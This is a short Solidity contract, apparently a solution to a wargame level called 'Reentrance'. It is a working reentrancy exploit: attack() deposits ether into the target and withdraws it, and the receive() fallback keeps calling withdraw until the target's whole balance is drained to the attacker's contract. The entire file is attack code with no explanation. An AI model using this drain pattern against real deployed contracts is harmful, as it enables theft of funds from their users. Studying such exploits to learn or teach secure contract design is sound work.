// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceSolution {
  address private owner;
  Reentrance private reentrance;
  uint256 initialAmount;

  constructor(address payable _reentrance) public payable {
    owner = msg.sender;
    reentrance = Reentrance(_reentrance);
  }

  function attack() external payable {
    require(msg.sender == owner);
    initialAmount = msg.value;
    reentrance.donate{value: initialAmount}(address(this));
    reentrance.withdraw(initialAmount);
  }

  receive() external payable {
    if (msg.sender == address(reentrance)) {
      uint256 balance = address(reentrance).balance;
      if (balance > 0) {
        if (balance > initialAmount) {
          reentrance.withdraw(initialAmount);
        } else {
          reentrance.withdraw(balance);
        }
      } 
    }
  }
}